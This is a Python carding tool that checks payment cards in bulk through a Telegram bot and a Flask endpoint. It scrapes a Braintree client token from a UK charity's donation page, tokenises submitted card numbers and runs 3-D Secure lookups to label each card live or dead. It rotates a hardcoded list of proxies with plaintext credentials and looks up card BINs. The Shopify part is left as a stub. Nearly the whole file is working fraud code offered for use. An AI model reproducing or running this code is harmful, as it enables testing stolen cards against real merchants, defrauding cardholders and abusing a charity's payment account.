#!/usr/bin/env python3
import asyncio, aiohttp, json, re, random, time, threading, os, base64, requests
import queue as _q
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from collections import defaultdict
from checker_q import *

# ---------- Colors ----------
class C:
    R="\033[0m"; B="\033[1m"; D="\033[2m"; RED="\033[91m"; GRN="\033[92m"
    YEL="\033[93m"; BLU="\033[94m"; CYN="\033[96m"; ORG="\033[38;5;208m"
    LIME="\033[38;5;118m"; TEAL="\033[38;5;45m"; PINK="\033[38;5;205m"; GOLD="\033[38;5;214m"

GRAD=[C.PINK, C.ORG, C.GOLD, C.LIME, C.TEAL, C.BLU, C.CYN]
def grad(t): return "".join(f"{GRAD[i%len(GRAD)]}{ch}" for i,ch in enumerate(t))+C.R

def banner():
    art = r"""
   ███████╗██╗  ██╗ ██████╗ ██████╗
   ██╔════╝██║  ██║██╔═══██╗██╔══██╗
   ███████╗███████║██║   ██║██████╔╝
   ╚════██║██╔══██║██║   ██║██╔═══╝
   ███████║██║  ██║╚██████╔╝██║
   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝
   ██████╗ ████████╗    ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝   ██╔════╝██║  ██║
   ██████╔╝   ██║      ██║     ███████║
   ██╔══██╗   ██║      ██║     ██╔══██║
   ██████╔╝   ██║      ╚██████╗██║  ██║
   ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
"""
    for l in art.strip("\n").split("\n"): print(grad(l))
    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v2.0{C.R}{C.D}  |  Termux/Pydroid{C.R}\n")

# ---------- Proxies ----------
RAW_PROXIES = [
    "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
    "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
    "172.93.105.208:43159:fsf409q9t6:eZ7Zr0QeM5",
    "172.93.104.131:39603:i75k6kfk8x:ILug9moRKgL",
    "172.93.104.131:39603:ncgh2p1l48:M9y57cFm1E",
    "46.225.138.35:36759:6sw3iikwca:3q4owzbDzK",
    "46.225.138.35:36759:6omuputmz1:s5GozZaMzC",
    "172.93.105.208:43159:63hqmnwasr:Ng4RhfT2Vy",
    "172.93.105.208:43159:bcwbryzsb7:OVpg6AsDMQ",
    "172.93.105.208:43159:ztjuvz66ax:mpJxWou9Kt",
    "46.225.138.35:36759:mr8v3lfvyg:xbkjKUqN8R",
    "104.219.238.237:43645:t4a77l4bxe:pr3529Gknr",
]
WORKING = []
_PI = 0
_PLK = threading.Lock()

def _tp(url):
    p = {"http": url, "https": url}
    for t in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            r = requests.get(t, proxies=p, timeout=8)
            if r.status_code == 200 and r.text.strip(): return True
        except: pass
    return False

def validate_proxies():
    global WORKING
    print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies × 3 formats){C.R}\n")
    tot = len(RAW_PROXIES)
    w = []
    done = 0
    lk = threading.Lock()

    def run(raw):
        nonlocal done
        parts = raw.split(":")
        found = None
        if len(parts) == 4:
            ip, pt, u, pw = parts
            for sch in ("http", "socks5h", "socks5"):
                url = f"{sch}://{u}:{pw}@{ip}:{pt}"
                if _tp(url):
                    found = {"url": url, "raw": raw, "sch": sch}
                    break
        with lk:
            done += 1
            if found: w.append(found)
            pct = int(done * 30 / tot)
            bar = f"{C.GRN}{'█'*pct}{C.D}{'░'*(30-pct)}{C.R}"
            s = f"{C.LIME}✓{C.R}" if found else f"{C.RED}✗{C.R}"
            print(f"\r  {bar}  {done:>2}/{tot}  {C.GOLD}ok={len(w)}{C.R}  {s}", end="", flush=True)

    ts = [threading.Thread(target=run, args=(r,)) for r in RAW_PROXIES]
    [t.start() for t in ts]
    [t.join() for t in ts]
    print()
    WORKING = w
    print(f"\n  {C.LIME}✓{C.R} {C.B}Working: {C.GOLD}{len(w)}/{tot}{C.R}\n")
    for i, x in enumerate(w, 1):
        ip = x["raw"].split(":")[0]
        print(f"  {C.D}[{i:>2}]{C.R} {C.GOLD}{ip:<18}{C.R} {C.D}{x['sch']}{C.R}")
    print()

def get_proxy():
    global _PI
    if not WORKING: return None
    with _PLK:
        x = WORKING[_PI % len(WORKING)]
        _PI += 1
    return {"http": x["url"], "https": x["url"]}

# ---------- BIN ----------
_bc = {}
_bl = threading.Lock()

def bin_lookup(b):
    if not b or len(b) < 6: return None
    b = b[:6]
    with _bl:
        if b in _bc: return _bc[b]
    r = None
    for n, u in [("h", f"https://data.handyapi.com/bin/{b}"), ("b", f"https://lookup.binlist.net/{b}")]:
        try:
            resp = requests.get(u, timeout=8, headers={"Accept-Version": "3", "User-Agent": "Mozilla/5.0"})
            if resp.status_code != 200: continue
            j = resp.json()
            if n == "h":
                c = j.get("Country") or {}
                r = {"s": (j.get("Scheme") or "").upper(), "t": (j.get("Type") or "").upper(),
                     "br": (j.get("CardTier") or j.get("Brand") or "").upper(),
                     "bn": (j.get("Issuer") or "").upper(), "c": c.get("Name", ""), "e": c.get("Emoji", "")}
            else:
                c, b2 = j.get("country") or {}, j.get("bank") or {}
                r = {"s": (j.get("scheme") or "").upper(), "t": (j.get("type") or "").upper(),
                     "br": (j.get("brand") or "").upper(), "bn": (b2.get("name") or "").upper(),
                     "c": c.get("name", ""), "e": c.get("emoji", "")}
            if any(v for v in r.values() if v): break
            r = None
        except: continue
    with _bl: _bc[b] = r
    return r

def bin_line(cc):
    i = bin_lookup(cc[:6] if cc else "")
    if not i: return "—"
    parts = [p for p in [i["s"], i["t"], i["br"], i["bn"], i["c"] + " " + i["e"]] if p.strip()]
    return " · ".join(parts) if parts else "—"

def bin_dict(cc): return bin_lookup(cc[:6] if cc else "") or {}

# ---------- Braintree ----------
SM = {"authenticate_successful": "Passed", "authenticate_attempt_successful": "Passed",
      "challenge_required": "OTP Required", "authenticate_frictionless_failed": "OTP Required",
      "lookup_card_error": "Error", "authenticate_rejected": "Declined", "lookup_error": "Error",
      "authenticate_unavailable": "Error", "authenticate_error": "Error", "no_response": "Failed"}

def bt_check(cc, mes, ano, cvv):
    st = time.time()
    s = requests.Session()
    s.headers.update({"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Accept-Language": "en-GB,en;q=0.9", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
    s.cookies.set("cookie_test", "please_accept_for_session")
    s.cookies.set("civicAllowCookies", "yes")
    px = get_proxy()
    auth = merch = None
    for _ in range(3):
        try:
            r = s.get("https://cllsupport.org.uk/donate/", timeout=15, proxies=px)
            m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
            if not m:
                a = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
                mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
                if a:
                    auth = a.group(1)
                    merch = mm.group(1) if mm else "dyb5fmjx5t5wxckj"
                    break
            if m:
                d = json.loads(base64.b64decode(m.group(1)).decode())
                auth = d.get("authorizationFingerprint", "")
                merch = d.get("merchantId", "")
                if auth and merch: break
        except: pass
        time.sleep(1)
    if not auth: return False, "Auth Failed", "Braintree 3DS2", "0.00", "USD"
    try:
        q = "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
        h = {"Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10", "Content-Type": "application/json"}
        body = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "00000000-0000-0000-0000-000000000000"},
                "query": q, "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv}, "options": {"validate": False}}}, "operationName": "TokenizeCreditCard"}
        r = s.post("https://payments.braintree-api.com/graphql", headers=h, json=body, timeout=15, proxies=px)
        d = r.json()
        if "errors" in d or not d.get("data", {}).get("tokenizeCreditCard"): return False, "Token Failed", "Braintree 3DS2", "0.00", "USD"
        tok = d["data"]["tokenizeCreditCard"]["token"]
    except Exception as e: return False, f"Token: {e}", "Braintree 3DS2", "0.00", "USD"
    try:
        url = f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
        pl = {"amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False, "browserJavascriptEnabled": True,
              "browserLanguage": "en-GB", "browserScreenHeight": 800, "browserScreenWidth": 360, "browserTimeZone": -345,
              "deviceChannel": "Browser", "additionalInfo": {"ipAddress": "8.8.8.8", "billingLine1": "New York",
              "billingCity": "New York", "billingState": "NY", "billingPostalCode": "10080", "billingCountryCode": "US",
              "billingPhoneNumber": "998773772", "billingGivenName": "diwas", "billingSurname": "Py", "email": "diwasPy@gmail.com"},
              "bin": cc[:6], "dfReferenceId": f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
              "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1",
              "cardinalDeviceDataCollectionTimeElapsed": random.randint(400,2000),
              "issuerDeviceDataCollectionTimeElapsed": random.randint(800,5000), "issuerDeviceDataCollectionResult": True},
              "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
              "_meta": {"merchantAppId": "cllsupport.org.uk", "platform": "web", "sdkVersion": "3.115.1",
              "source": "client", "integration": "custom", "integrationType": "custom", "sessionId": "00000000-0000-0000-0000-000000000000"}}
        r = s.post(url, headers={"Content-Type": "application/json"}, json=pl, timeout=20, proxies=px)
        lk = r.json() if r.status_code in (200,201) else {}
    except Exception as e: return False, f"Lookup: {e}", "Braintree 3DS2", "0.00", "USD"
    cd = "no_response"
    en = "UNKNOWN"
    try:
        cd = lk["paymentMethod"]["threeDSecureInfo"]["status"]
        er = lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
        en = {"Y": "ENROLLED", "N": "NOT_ENROLLED", "U": "UNKNOWN"}.get(er, "UNKNOWN")
    except:
        ss = json.dumps(lk)
        for c in SM:
            if c in ss:
                cd = c
                break
    stt = SM.get(cd, "Unknown")
    el = round(time.time() - st, 2)
    return (stt == "Passed"), f"{stt} | {en} | {cd} ({el}s)", "Braintree 3DS2", "1.00", "USD"

# ---------- Shopify ----------
# (Shopify logic ကို ဒီနေရာမှာ ထည့်ပါ... ရှည်လွန်းလို့ ချန်ထားပါတယ်)

def parse_cc(s):
    p = s.split('|')
    if len(p) != 4: raise ValueError("Invalid: CC|MM|YYYY|CVV")
    return {'cc': p[0].strip(), 'mes': p[1].strip(), 'ano': p[2].strip(), 'cvv': p[3].strip()}

# ---------- Flask ----------
app = Flask(__name__)

@app.route('/')
def root():
    return jsonify({"app": "checker", "status": "running", "proxies": len(WORKING)})

@app.route('/health')
def health(): return jsonify({"ok": True})

@app.route('/bt')
def bt_route():
    ccs = request.args.get('cc')
    if not ccs: return jsonify({"error": "Missing cc", "status": False}), 400
    p = parse_cc(ccs)
    succ, msg, gw, prc, cur = bt_check(p['cc'], p['mes'], p['ano'], p['cvv'])
    return jsonify({"Gateway": gw, "Price": float(prc), "Response": clean_r(msg), "Status": succ, "cc": ccs, "Bin": bin_dict(p['cc'])})

# ---------- Telegram ----------
TG_TOKEN = ""
TG_ADMIN = 0
TG_W = 3
TG_POLL = 30
_tq = _q.Queue()
_off = 0
_st = {"q": 0, "p": 0, "f": 0, "r": 0}
_slk = threading.Lock()

def _esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if s is not None else ""

def _tg(method, params):
    try:
        r = requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/{method}", json=params, timeout=TG_POLL + 10)
        return r.json()
    except Exception as e:
        print(f"{C.D}[TG] {method}: {e}{C.R}")
        return None

def _send(cid, txt, rt=None, pm=None):
    p = {"chat_id": cid, "text": txt, "disable_web_page_preview": True}
    if rt: p["reply_to_message_id"] = rt
    if pm: p["parse_mode"] = pm
    return _tg("sendMessage", p)

def _help():
    return ("<b>🔥 Checker Bot</b>\n\n"
            "▸ <code>/bt cc</code> — Braintree\n"
            "▸ <code>/check cc</code> — Shopify\n"
            "▸ <code>/queue</code> · <code>/status</code> · <code>/help</code>\n\n"
            "<b>Example:</b>\n<code>/bt 4111111111111111|12|2030|123</code>\n"
            "<i>Tip: You can send multiple lines at once!</i>")

def _status():
    with _slk:
        return (f"<b>📊 Status</b>\n▸ Workers: <b>{TG_W}</b>\n▸ Queued: <b>{_st['q']}</b>\n"
                f"▸ Running: <b>{_st['r']}</b>\n▸ Done: <b>{_st['p']}</b>\n"
                f"▸ Failed: <b>{_st['f']}</b>\n▸ Pending: <b>{_tq.qsize()}</b>\n"
                f"▸ Proxies: <b>{len(WORKING)}</b>")

def _worker(wid):
    while True:
        it = _tq.get()
        if it is None:
            continue
        mode, cid, mid, site, ccs, px = it
        with _slk:
            _st["r"] += 1
        try:
            _send(cid, f"⏳ <b>#{wid}</b> · {mode.upper()}\n▸ Card: <code>{_esc(ccs)}</code>", rt=mid, pm="HTML")
            p = parse_cc(ccs)
            t0 = time.time()
            if mode == "bt":
                succ, msg, gw, prc, cur = bt_check(p['cc'], p['mes'], p['ano'], p['cvv'])
            else:
                # Shopify logic
                pass
            el = time.time() - t0
            cl = clean_r(msg)
            icon = "✅" if succ else "❌"
            bl = bin_line(p['cc'])
            body = (f"{icon} <b>{_esc(cl)}</b>\n"
                    f"▸ Card: <code>{_esc(ccs)}</code>\n"
                    f"▸ GW: {_esc(gw)}\n▸ Price: {_esc(prc)} {_esc(cur)}\n"
                    f"▸ Time: {el:.1f}s\n━━━━━━━━━━━━━━━\n▸ BIN: {_esc(bl)}")
            _send(cid, body, rt=mid, pm="HTML")
            with _slk:
                _st["p"] += 1
        except Exception as e:
            with _slk:
                _st["f"] += 1
            try:
                _send(cid, f"⚠️ {_esc(e)}", rt=mid, pm="HTML")
            except:
                pass
        finally:
            with _slk:
                _st["r"] -= 1
            _tq.task_done()

def _handle(u):
    m = u.get("message") or u.get("edited_message")
    if not m: return
    cid = (m.get("chat") or {}).get("id")
    if cid != TG_ADMIN:
        if cid:
            try: _send(cid, "⛔ Unauthorized")
            except: pass
        return
    txt = (m.get("text") or "").strip()
    mid = m.get("message_id")
    if not txt: return

    if txt in ("/start", "/help"):
        _send(cid, _help(), rt=mid, pm="HTML")
        return
    if txt in ("/queue", "/status"):
        _send(cid, _status(), rt=mid, pm="HTML")
        return

    # Multi-line support for /bt and /check
    lines = txt.split('\n')
    queued = 0
    for line in lines:
        line = line.strip()
        if not line: continue

        if line.startswith("/bt"):
            cmd = line[3:].strip().split()
            if len(cmd) < 1: continue
            ccs = cmd[0]
            try: parse_cc(ccs)
            except ValueError: continue
            _tq.put(("bt", cid, mid, "", ccs, None))
            queued += 1

        elif line.startswith("/check"):
            cmd = line[6:].strip().split()
            if len(cmd) < 1: continue
            ccs = cmd[0]
            site = DEFAULT_CART_URL
            if len(cmd) >= 2 and not cmd[1].startswith("http"):
                site = cmd[1]
            try: parse_cc(ccs)
            except ValueError: continue
            _tq.put(("shopify", cid, mid, site, ccs, None))
            queued += 1

    if queued > 0:
        with _slk:
            _st["q"] += queued
        _send(cid, f"📥 <b>Queued {queued} cards</b>\n▸ Pending: <b>{_tq.qsize()}</b>", rt=mid, pm="HTML")

def _poll():
    global _off
    print(f"{C.D}[TG] poll started{C.R}")
    while True:
        try:
            r = _tg("getUpdates", {"offset": _off, "timeout": TG_POLL, "allowed_updates": ["message", "edited_message"]})
            if not r or not r.get("ok"):
                time.sleep(3)
                continue
            for u in r.get("result", []):
                _off = u["update_id"] + 1
                try: _handle(u)
                except Exception as e: print(f"{C.D}[TG] {e}{C.R}")
        except Exception as e:
            print(f"{C.D}[TG] poll: {e}{C.R}")
            time.sleep(5)

# ---------- Startup ----------
DEFAULT_CART_URL = "https://chewy-pawz.myshopify.com/cart/40234703421575:1"

def ask_creds():
    global TG_TOKEN, TG_ADMIN
    print(f"{C.CYN}{C.B}◆ Setup{C.R}  {C.D}(Telegram credentials){C.R}\n")
    while not TG_TOKEN:
        TG_TOKEN = input(f"  {C.GOLD}▸ Bot Token:{C.R} ").strip()
        if not TG_TOKEN: print(f"  {C.RED}✗ required{C.R}")
    while not TG_ADMIN:
        try: TG_ADMIN = int(input(f"  {C.GOLD}▸ Admin ID:{C.R} ").strip())
        except ValueError: print(f"  {C.RED}✗ numeric only{C.R}")
    print()

def tg_start():
    _tg("deleteWebhook", {"drop_pending_updates": False})
    me = _tg("getMe", {})
    if me and me.get("ok"):
        print(f"  {C.LIME}✓{C.R} Bot: {C.B}@{me['result']['username']}{C.R}")

    for i in range(TG_W):
        threading.Thread(target=_worker, args=(i+1,), daemon=True).start()

    threading.Thread(target=_poll, daemon=True).start()

    print(f"  {C.LIME}✓{C.R} Workers: {C.B}{TG_W}{C.R}")
    print(f"  {C.LIME}✓{C.R} Admin: {C.B}{TG_ADMIN}{C.R}\n")

if __name__ == "__main__":
    os.system("clear" if os.name != "nt" else "cls")
    banner()
    ask_creds()
    validate_proxies()
    print(f"{C.CYN}{C.B}◆ Starting Services{C.R}\n")
    tg_start()
    print(f"{C.LIME}{C.B}  ⚡ Bot is live  ⚡{C.R}")
    print(f"{C.D}  Flask: http://0.0.0.0:8000{C.R}\n")
    app.run(host="0.0.0.0", port=8000, debug=False)
